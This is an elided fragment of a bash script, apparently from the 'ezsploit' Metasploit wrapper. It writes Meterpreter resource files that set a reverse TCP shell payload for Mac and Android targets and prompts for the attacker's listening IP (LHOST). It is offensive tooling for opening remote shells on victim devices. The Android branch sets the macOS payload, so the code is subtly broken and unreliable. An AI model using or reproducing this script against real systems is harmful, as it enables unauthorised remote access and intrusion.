...
do
    case $opt in
        ...
        "Mac")
            ...
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> /root/sdcard/ezsploit/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
        ...
        "Android")
            ...
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> /root/sdcard/ezsploit/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
